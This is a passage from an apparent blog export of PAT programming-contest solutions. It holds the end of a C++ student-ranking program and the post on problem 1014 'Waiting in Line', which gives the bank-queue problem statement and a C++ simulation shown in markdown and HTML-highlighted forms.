<span class=\"keyword\">long</span> uLL;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">2e3</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> S&#123;</div><div class=\"line\">\t<span class=\"built_in\">string</span> name;</div><div class=\"line\">\t<span class=\"keyword\">int</span> a[<span class=\"number\">4</span>];</div><div class=\"line\">\t<span class=\"keyword\">int</span> b[<span class=\"number\">4</span>];</div><div class=\"line\">\t<span class=\"keyword\">int</span> r[<span class=\"number\">4</span>];</div><div class=\"line\">\t<span class=\"keyword\">int</span> g;</div><div class=\"line\">&#125;stu[maxN];</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, m;</div><div class=\"line\"><span class=\"keyword\">char</span> sym[] = <span class=\"string\">\"ACME\"</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> tmp[maxN];</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; n &gt;&gt; m;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">cin</span> &gt;&gt; stu[i].name;</div><div class=\"line\">\t\t<span class=\"keyword\">float</span> tmp = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">4</span>; j++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">cin</span> &gt;&gt; stu[i].a[j];</div><div class=\"line\">\t\t\ttmp += stu[i].a[j];</div><div class=\"line\">\t\t\tstu[i].b[j] = stu[i].a[j];</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tstu[i].a[<span class=\"number\">0</span>] = tmp / <span class=\"number\">3.0</span>;</div><div class=\"line\">\t\tstu[i].b[<span class=\"number\">0</span>] = tmp / <span class=\"number\">3.0</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++) tmp[j] = j;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p = <span class=\"number\">0</span>; p &lt; n - <span class=\"number\">1</span>; p++)</div><div class=\"line\">\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> q = p + <span class=\"number\">1</span>; q &lt; n; q++)</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (stu[q].a[i] &gt; stu[p].a[i])</div><div class=\"line\">\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\tswap(stu[q].a[i], stu[p].a[i]);</div><div class=\"line\">\t\t\t\t\tswap(tmp[p], tmp[q]);</div><div class=\"line\">\t\t\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++)</div><div class=\"line\">\t\t\tstu[tmp[j]].r[i] = j;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n - <span class=\"number\">1</span>; j++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stu[tmp[j]].b[i] == stu[tmp[j + <span class=\"number\">1</span>]].b[i])</div><div class=\"line\">\t\t\t\tstu[tmp[j + <span class=\"number\">1</span>]].r[i] = stu[tmp[j]].r[i];</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> tmp = maxN;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">4</span>; j++)</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stu[i].r[j] &lt; tmp)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\ttmp = stu[i].r[j];</div><div class=\"line\">\t\t\t\tstu[i].g = j;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"comment\">//</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">string</span> in;</div><div class=\"line\">\t\t<span class=\"built_in\">cin</span> &gt;&gt; in;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; n; j++)</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stu[j].name == in)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; stu[j].r[stu[j].g] + <span class=\"number\">1</span> &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; sym[stu[j].g] &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (j == n)</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"N/A\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1014","date":"2017-02-14T09:27:34.000Z","_content":"\n## Description\n\n> 1014.Waiting in Line (30)\n\n> Suppose a bank has N windows open for service. There is a yellow line in front of the windows which devides the waiting area into two parts. The rules for the customers to wait in line are:\n\n> The space inside the yellow line in front of each window is enough to contain a line with M customers. Hence when all the N lines are full, all the customers after (and including) the (NM+1)st one will have to wait in a line behind the yellow line.\nEach customer will choose the shortest line to wait in when crossing the yellow line. If there are two or more lines with the same length, the customer will always choose the window with the smallest number.\nCustomer[i] will take T[i] minutes to have his/her transaction processed.\nThe first N customers are assumed to be served at 8:00am.\nNow given the processing time of each customer, you are supposed to tell the exact time at which a customer has his/her business done.\n\n> For example, suppose that a bank has 2 windows and each window may have 2 custmers waiting inside the yellow line. There are 5 customers waiting with transactions taking 1, 2, 6, 4 and 3 minutes, respectively. At 08:00 in the morning, customer1 is served at window1 while customer2 is served at window2. Customer3 will wait in front of window1 and customer4 will wait in front of window2. Customer5 will wait behind the yellow line.\n\n> At 08:01, customer1 is done and customer5 enters the line in front of window1 since that line seems shorter now. Customer2 will leave at 08:02, customer4 at 08:06, customer3 at 08:07, and finally customer5 at 08:10.\n\n> Input\n\n> Each input file contains one test case. Each case starts with a line containing 4 positive integers: N (<=20, number of windows), M (<=10, the maximum capacity of each line inside the yellow line), K (<=1000, number of customers), and Q (<=1000, number of customer queries).\n\n> The next line contains K positive integers, which are the processing time of the K customers.\n\n> The last line contains Q positive integers, which represent the customers who are asking about the time they can have their transactions done. The customers are numbered from 1 to K.\n\n> Output\n\n> For each of the Q customers, print in one line the time at which his/her transaction is finished, in the format HH:MM where HH is in [08, 17] and MM is in [00, 59]. Note that since the bank is closed everyday after 17:00, for those customers who cannot be served before 17:00, you must output \"Sorry\" instead.\n\n> Sample Input\n2 2 7 5\n1 2 6 4 3 534 2\n3 4 5 6 7\n\n> Sample Output\n08:07\n08:06\n08:10\n17:00\nSorry\n\n我自己写的代码vs上编译没问题，g++编译不过，至今明白为什么，自己测试应该是对的。贴了参考别人的。\n\n## Code\n\n```\n#include<cstdio>  \n#include<string>  \n#include<cstring>  \n#include<vector>  \n#include<iostream>  \n#include<queue>  \n#include<algorithm>  \nusing namespace std;\ntypedef long long LL;\nconst int INF = 0x7FFFFFFF;\nconst int maxn = 1e3 + 10;\nint T, a, b, n, q, x, t[maxn];\nqueue<int> p[maxn];\n\nstruct point\n{\n\tint x, y;\n\tpoint(int x = 0, int y = 0) :x(x), y(y){}\n}f[maxn];\n\nint main()\n{\n\tscanf(\"%d%d%d%d\", &a, &b, &n, &q);\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tscanf(\"%d\", &x);\n\t\tint min = 1;\n\t\tfor (int j = 1; j <= a; j++)\n\t\t{\n\t\t\tif (i <= a*b)\n\t\t\t{\n\t\t\t\tif (p[j].size() < p[min].size()) min = j;\n\t\t\t}\n\t\t\telse if (p[j].front() < p[min].front())\n\t\t\t\tmin = j;\n\t\t}\n\t\tt[min] += x;\n\t\tp[min].push(t[min]);\n\t\tif (i > a*b) p[min].pop();\n\t\tif (t[min] - x < 540)f[i] = point(8 + t[min] / 60, t[min] % 60);\n\t\telse f[i] = point(18, 0);\n\t}\n\twhile (q--)\n\t{\n\t\tscanf(\"%d\", &x);\n\t\t(f[x].x < 18) ? printf(\"%02d:%02d\\n\", f[x].x, f[x].y) : printf(\"Sorry\\n\");\n\t}\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1014.md","raw":"---\ntitle: PAT advanced 1014\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-14 17:27:34\n---\n\n## Description\n\n> 1014.Waiting in Line (30)\n\n> Suppose a bank has N windows open for service. There is a yellow line in front of the windows which devides the waiting area into two parts. The rules for the customers to wait in line are:\n\n> The space inside the yellow line in front of each window is enough to contain a line with M customers. Hence when all the N lines are full, all the customers after (and including) the (NM+1)st one will have to wait in a line behind the yellow line.\nEach customer will choose the shortest line to wait in when crossing the yellow line. If there are two or more lines with the same length, the customer will always choose the window with the smallest number.\nCustomer[i] will take T[i] minutes to have his/her transaction processed.\nThe first N customers are assumed to be served at 8:00am.\nNow given the processing time of each customer, you are supposed to tell the exact time at which a customer has his/her business done.\n\n> For example, suppose that a bank has 2 windows and each window may have 2 custmers waiting inside the yellow line. There are 5 customers waiting with transactions taking 1, 2, 6, 4 and 3 minutes, respectively. At 08:00 in the morning, customer1 is served at window1 while customer2 is served at window2. Customer3 will wait in front of window1 and customer4 will wait in front of window2. Customer5 will wait behind the yellow line.\n\n> At 08:01, customer1 is done and customer5 enters the line in front of window1 since that line seems shorter now. Customer2 will leave at 08:02, customer4 at 08:06, customer3 at 08:07, and finally customer5 at 08:10.\n\n> Input\n\n> Each input file contains one test case. Each case starts with a line containing 4 positive integers: N (<=20, number of windows), M (<=10, the maximum capacity of each line inside the yellow line), K (<=1000, number of customers), and Q (<=1000, number of customer queries).\n\n> The next line contains K positive integers, which are the processing time of the K customers.\n\n> The last line contains Q positive integers, which represent the customers who are asking about the time they can have their transactions done. The customers are numbered from 1 to K.\n\n> Output\n\n> For each of the Q customers, print in one line the time at which his/her transaction is finished, in the format HH:MM where HH is in [08, 17] and MM is in [00, 59]. Note that since the bank is closed everyday after 17:00, for those customers who cannot be served before 17:00, you must output \"Sorry\" instead.\n\n> Sample Input\n2 2 7 5\n1 2 6 4 3 534 2\n3 4 5 6 7\n\n> Sample Output\n08:07\n08:06\n08:10\n17:00\nSorry\n\n我自己写的代码vs上编译没问题，g++编译不过，至今明白为什么，自己测试应该是对的。贴了参考别人的。\n\n## Code\n\n```\n#include<cstdio>  \n#include<string>  \n#include<cstring>  \n#include<vector>  \n#include<iostream>  \n#include<queue>  \n#include<algorithm>  \nusing namespace std;\ntypedef long long LL;\nconst int INF = 0x7FFFFFFF;\nconst int maxn = 1e3 + 10;\nint T, a, b, n, q, x, t[maxn];\nqueue<int> p[maxn];\n\nstruct point\n{\n\tint x, y;\n\tpoint(int x = 0, int y = 0) :x(x), y(y){}\n}f[maxn];\n\nint main()\n{\n\tscanf(\"%d%d%d%d\", &a, &b, &n, &q);\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tscanf(\"%d\", &x);\n\t\tint min = 1;\n\t\tfor (int j = 1; j <= a; j++)\n\t\t{\n\t\t\tif (i <= a*b)\n\t\t\t{\n\t\t\t\tif (p[j].size() < p[min].size()) min = j;\n\t\t\t}\n\t\t\telse if (p[j].front() < p[min].front())\n\t\t\t\tmin = j;\n\t\t}\n\t\tt[min] += x;\n\t\tp[min].push(t[min]);\n\t\tif (i > a*b) p[min].pop();\n\t\tif (t[min] - x < 540)f[i] = point(8 + t[min] / 60, t[min] % 60);\n\t\telse f[i] = point(18, 0);\n\t}\n\twhile (q--)\n\t{\n\t\tscanf(\"%d\", &x);\n\t\t(f[x].x < 18) ? printf(\"%02d:%02d\\n\", f[x].x, f[x].y) : printf(\"Sorry\\n\");\n\t}\n\treturn 0;\n}\n```","slug":"PAT-advanced-1014","published":1,"updated":"2017-02-14T09:31:24.709Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k010025hv18a1r0n712","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1014.Waiting in Line (30)</p>\n<p>Suppose a bank has N windows open for service. There is a yellow line in front of the windows which devides the waiting area into two parts. The rules for the customers to wait in line are:</p>\n<p>The space inside the yellow line in front of each window is enough to contain a line with M customers. Hence when all the N lines are full, all the customers after (and including) the (NM+1)st one will have to wait in a line behind the yellow line.<br>Each customer will choose the shortest line to wait in when crossing the yellow line. If there are two or more lines with the same length, the customer will always choose the window with the smallest number.<br>Customer[i] will take T[i] minutes to have his/her transaction processed.<br>The first N customers are assumed to be served at 8:00am.<br>Now given the processing time of each customer, you are supposed to tell the exact time at which a customer has his/her business done.</p>\n<p>For example, suppose that a bank has 2 windows and each window may have 2 custmers waiting inside the yellow line. There are 5 customers waiting with transactions taking 1, 2, 6, 4 and 3 minutes, respectively. At 08:00 in the morning, customer1 is served at window1 while customer2 is served at window2. Customer3 will wait in front of window1 and customer4 will wait in front of window2. Customer5 will wait behind the yellow line.</p>\n<p>At 08:01, customer1 is done and customer5 enters the line in front of window1 since that line seems shorter now. Customer2 will leave at 08:02, customer4 at 08:06, customer3 at 08:07, and finally customer5 at 08:10.</p>\n<p>Input</p>\n<p>Each input file contains one test case. Each case starts with a line containing 4 positive integers: N (&lt;=20, number of windows), M (&lt;=10, the maximum capacity of each line inside the yellow line), K (&lt;=1000, number of customers), and Q (&lt;=1000, number of customer queries).</p>\n<p>The next line contains K positive integers, which are the processing time of the K customers.</p>\n<p>The last line contains Q positive integers, which represent the customers who are asking about the time they can have their transactions done. The customers are numbered from 1 to K.</p>\n<p>Output</p>\n<p>For each of the Q customers, print in one line the time at which his/her transaction is finished, in the format HH:MM where HH is in [08, 17] and MM is in [00, 59]. Note that since the bank is closed everyday after 17:00, for those customers who cannot be served before 17:00, you must output “Sorry” instead.</p>\n<p>Sample Input<br>2 2 7 5<br>1 2 6 4 3 534 2<br>3 4 5 6 7</p>\n<p>Sample Output<br>08:07<br>08:06<br>08:10<br>17:00<br>Sorry</p>\n</blockquote>\n<p>我自己写的代码vs上编译没问题，g++编译不过，至今明白为什么，自己测试应该是对的。贴了参考别人的。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstring&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span>  </span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> INF = <span class=\"number\">0x7FFFFFFF</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxn = <span class=\"number\">1e3</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> T, a, b, n, q, x, t[maxn];</div><div class=\"line\">queue&lt;<span class=\"keyword\">int</span>&gt; p[maxn];</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> <span class=\"built_in\">point</span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> x, y;</div><div class=\"line\">\t<span class=\"built_in\">point</span>(<span class=\"keyword\">int</span> x = <span class=\"number\">0</span>, <span class=\"keyword\">int</span> y = <span class=\"number\">0</span>) :x(x), y(y)&#123;&#125;</div><div class=\"line\">&#125;f[maxn];</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tscanf(<span class=\"string\">\"%d%d%d%d\"</span>, &amp;a, &amp;b, &amp;n, &amp;q);</div><div class=\"line\">\t<span class=\"built_in\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> <span class=\"built_in\">min</span> = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t<span class=\"built_in\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt;= a; j++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">if</span> (i &lt;= a*b)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">if</span> (p[j].<span class=\"built_in\">size</span>() &lt; p[<span class=\"built_in\">min</span>].<span class=\"built_in\">size</span>()) <span class=\"built_in\">min</span> = j;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"built_in\">else</span> <span class=\"built_in\">if</span> (p[j].front() &lt; p[<span class=\"built_in\">min</span>].front())</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">min</span> = j;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tt[<span class=\"built_in\">min</span>] += x;</div><div class=\"line\">\t\tp[<span class=\"built_in\">min</span>].push(t[<span class=\"built_in\">min</span>]);</div><div class=\"line\">\t\t<span class=\"built_in\">if</span> (i &gt; a*b) p[<span class=\"built_in\">min</span>].pop();</div><div class=\"line\">\t\t<span class=\"built_in\">if</span> (t[<span class=\"built_in\">min</span>] - x &lt; <span class=\"number\">540</span>)f[i] = <span class=\"built_in\">point</span>(<span class=\"number\">8</span> + t[<span class=\"built_in\">min</span>] / <span class=\"number\">60</span>, t[<span class=\"built_in\">min</span>] % <span class=\"number\">60</span>);</div><div class=\"line\">\t\t<span class=\"built_in\">else</span> f[i] = <span class=\"built_in\">point</span>(<span class=\"number\">18</span>, <span class=\"number\">0</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">while</span> (q--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t(f[x].x &lt; <span class=\"number\">18</span>) ? printf(<span class=\"string\">\"%02d:%02d\\n\"</span>, f[x].x, f[x].y) : printf(<span class=\"string\">\"Sorry\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1014.Waiting in Line (30)</p>\n<p>Suppose a bank has N windows open for service. There is a yellow line in front of the windows which devides the waiting area into two parts. The rules for the customers to wait in line are:</p>\n<p>The space inside the yellow line in front of each window is enough to contain a line with M customers. Hence when all the N lines are full, all the customers after (and including) the (NM+1)st one will have to wait in a line behind the yellow line.<br>Each customer will choose the shortest line to wait in when crossing the yellow line. If there are two or more lines with the same length, the customer will always choose the window with the smallest number.<br>Customer[i] will take T[i] minutes to have his/her transaction processed.<br>The first N customers are assumed to be served at 8:00am.<br>Now given the processing time of each customer, you are supposed to tell the exact time at which a customer has his/her business done.</p>\n<p>For example, suppose that a bank has 2 windows and each window may have 2 custmers waiting inside the yellow line. There are 5 customers waiting with transactions taking 1, 2, 6, 4 and 3 minutes, respectively. At 08:00 in the morning, customer1 is served at window1 while customer2 is served at window2. Customer3 will wait in front of window1 and customer4 will wait in front of window2. Customer5 will wait behind the yellow line.</p>\n<p>At 08:01, customer1 is done and customer5 enters the line in front of window1 since that line seems shorter now. Customer2 will leave at 08:02, customer4 at 08:06, customer3 at 08:07, and finally customer5 at 08:10.</p>\n<p>Input</p>\n<p>Each input file contains one test case. Each case starts with a line containing 4 positive integers: N (&lt;=20, number of windows), M (&lt;=10, the maximum capacity of each line inside the yellow line), K (&lt;=1000, number of customers), and Q (&lt;=1000, number of customer queries).</p>\n<p>The next line contains K positive integers, which are the processing time of the K customers.</p>\n<p>The last line contains Q positive integers, which represent the customers who are asking about the time they can have their transactions done. The customers are numbered from 1 to K.</p>\n<p>Output</p>\n<p>For each of the Q customers, print in one line the time at which his/her transaction is finished, in the format HH:MM where HH is in [08, 17] and MM is in [00, 59]. Note that since the bank is closed everyday after 17:00, for those customers who cannot be served before 17:00, you must output “Sorry” instead.</p>\n<p>Sample Input<br>2 2 7 5<br>1 2 6 4 3 534 2<br>3 4 5 6 7</p>\n<p>Sample Output<br>08:07<br>08:06<br>08:10<br>17:00<br>Sorry</p>\n</blockquote>\n<p>我自己写的代码vs上编译没问题，g++编译不过，至今明白为什么，自己测试应该是对的。贴了参考别人的。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstring&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span>  </span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> INF = <span class=\"number\">0x7FFFFFFF</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxn = <span class=\"number\">1e3</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> T, a, b, n, q, x, t[maxn];</div><div class=\"line\">queue&lt;<span class=\"keyword\">int</span>&gt; p[maxn];</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> <span class=\"built_in\">point</span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> x, y;</div><div class=\"line\">\t<span class=\"built_in\">point</span>(<span class=\"keyword\">int</span> x = <span class=\"number\">0</span>, <span class=\"keyword\">int</span> y = <span class=\"number\">0</span>) :x(x), y(y)&#123;&#125;</div><div class=\"line\">&#125;f[maxn];</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tscanf(<span class=\"string\">\"%d%d%d%d\"</span>, &amp;a, &amp;b, &amp;n, &amp;q);</div><div class=\"line\">\t<span class=\"built_in\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> <span class=\"built_in\">min</span> = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t<span class=\"built_in\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt;= a; j++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">if</span> (i &lt;= a*b)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">if</span> (p[j].<span class=\"built_in\">size</span>() &lt; p[<span class=\"built_in\">min</span>].<span class=\"built_in\">size</span>()) <span class=\"built_in\">min</span> = j;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"built_in\">else</span> <span class=\"built_in\">if</span> (p[j].front() &lt; p[<span class=\"built_in\">min</span>].front())</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">min</span> = j;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tt[<span class=\"built_in\">min</span>] += x;</div><div class=\"line\">\t\tp[<span class=\"built_in\">min</span>].push(t[<span class=\"built_in\">min</span>]);</div><div class=\"line\">\t\t<span class=\"built_in\">if</span> (i &gt; a*b) p[<span class=\"built_in\">min</span>].pop();</div><div class=\"line\">\t\t<span class=\"built_in\">if</span> (t[<span class=\"built_in\">min</span>] - x &lt; <span class=\"number\">540</span>)f[i] = <span class=\"built_in\">point</span>(<span class=\"number\">8</span> + t[<span class=\"built_in\">min</span>] / <span class=\"number\">60</span>, t[<span class=\"built_in\">min</span>] % <span 